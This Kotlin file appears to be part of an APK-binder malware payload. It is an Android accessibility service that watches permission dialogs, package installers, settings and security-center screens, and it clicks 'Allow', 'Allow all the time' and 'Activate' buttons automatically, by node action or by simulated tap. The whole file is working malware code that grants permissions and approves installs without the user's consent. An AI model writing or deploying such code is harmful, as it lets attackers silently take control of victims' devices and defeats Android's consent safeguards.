package Com.devhs.apkbinder.payload

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.AccessibilityServiceInfo
import android.accessibilityservice.GestureDescription
import android.graphics.Path
import android.graphics.Rect
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo

class HsAccessibility : AccessibilityService() {

    private var lastClick = 0L
    private var lastKey = ""

    override fun onServiceConnected() {
        super.onServiceConnected()
        HsLog.init(this)
        try {
            val i = AccessibilityServiceInfo()
            i.eventTypes = AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED or
                    AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED
            i.feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC
            i.flags = AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS or
                    AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS
            i.notificationTimeout = 40L
            serviceInfo = i
        } catch (t: Throwable) {
            HsLog.e("a11y config: ${t.message}")
        }
        HsLog.w("a11y connected")
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        val e = event ?: return
        val pkg = e.packageName?.toString() ?: return
        if (!isDialogPkg(pkg)) return
        val root = try {
            rootInActiveWindow
        } catch (t: Throwable) {
            null
        } ?: return
        allow(root, pkg)
    }

    override fun onInterrupt() {
    }

    private fun isDialogPkg(pkg: String): Boolean {
        val p = pkg.lowercase()
        if (p == packageName.lowercase()) return false
        return p.contains("permissioncontroller") ||
                p.contains("packageinstaller") ||
                p.contains("permissionui") ||
                p == "com.android.settings" ||
                p.contains("securitycenter")
    }

    private fun allow(root: AccessibilityNodeInfo, pkg: String) {
        clickRadio(root, pkg)

        val ids = listOf(
            "permission_allow_button",
            "permission_allow_foreground_only_button",
            "permission_allow_one_time_button",
            "permission_allow_all_the_time_button",
            "allow_button",
            "button1"
        )
        for (id in ids) {
            val list = try {
                root.findAccessibilityNodeInfosByViewId(pkg + ":id/" + id)
            } catch (t: Throwable) {
                null
            } ?: continue
            for (n in list) if (tryClick(n, id)) return
        }

        val texts = listOf(
            "Allow", "While using the app", "Only this time",
            "Allow all the time", "Allow all", "Activate"
        )
        for (t in texts) {
            val list = try {
                root.findAccessibilityNodeInfosByText(t)
            } catch (e: Throwable) {
                null
            } ?: continue
            for (n in list) if (tryClick(n, t)) return
        }
    }

    private fun clickRadio(root: AccessibilityNodeInfo, pkg: String) {
        for (id in listOf("permission_allow_all_button", "permission_media_all_button")) {
            val list = try {
                root.findAccessibilityNodeInfosByViewId(pkg + ":id/" + id)
            } catch (t: Throwable) {
                null
            } ?: continue
            if (list.isNotEmpty()) tryClick(list[0], id)
        }
    }

    private fun tryClick(n: AccessibilityNodeInfo, key: String): Boolean {
        val now = System.currentTimeMillis()
        if (key == lastKey && now - lastClick < 1000) return true
        if (click(n)) {
            lastKey = key
            lastClick = now
            HsLog.w("a11y click $key")
            return true
        }
        return false
    }

    private fun click(n: AccessibilityNodeInfo): Boolean {
        var node: AccessibilityNodeInfo? = n
        var depth = 0
        while (node != null && depth < 4) {
            if (node.isClickable) {
                try {
                    if (node.performAction(AccessibilityNodeInfo.ACTION_CLICK)) return true
                } catch (t: Throwable) {
                }
            }
            node = try {
                node.parent
            } catch (t: Throwable) {
                null
            }
            depth++
        }
        return tap(n)
    }

    private fun tap(n: AccessibilityNodeInfo): Boolean = try {
        val r = Rect()
        n.getBoundsInScreen(r)
        if (r.width() <= 0 || r.height() <= 0) false else {
            val p = Path()
            p.moveTo(r.exactCenterX(), r.exactCenterY())
            val s = GestureDescription.StrokeDescription(p, 0L, 60L)
            dispatchGesture(GestureDescription.Builder().addStroke(s).build(), null, null)
        }
    } catch (t: Throwable) {
        false
    }
}
